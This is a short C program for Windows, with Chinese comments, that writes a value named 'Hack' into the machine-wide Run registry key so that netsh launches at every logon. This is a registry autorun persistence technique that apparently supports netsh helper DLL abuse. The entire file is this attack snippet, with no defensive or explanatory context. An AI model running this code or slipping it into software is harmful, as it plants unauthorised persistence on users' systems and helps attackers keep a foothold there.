#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  //设置启动netsh
  const char* netsh = "C:\\Windows\\SysWOW64\\netsh";
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    //创建新的注册表项
    RegSetValueEx(hkey, (LPCSTR)"Hack", 0, REG_SZ, (unsigned char*)netsh, strlen(netsh));
    RegCloseKey(hkey);
  }
  return 0;
}
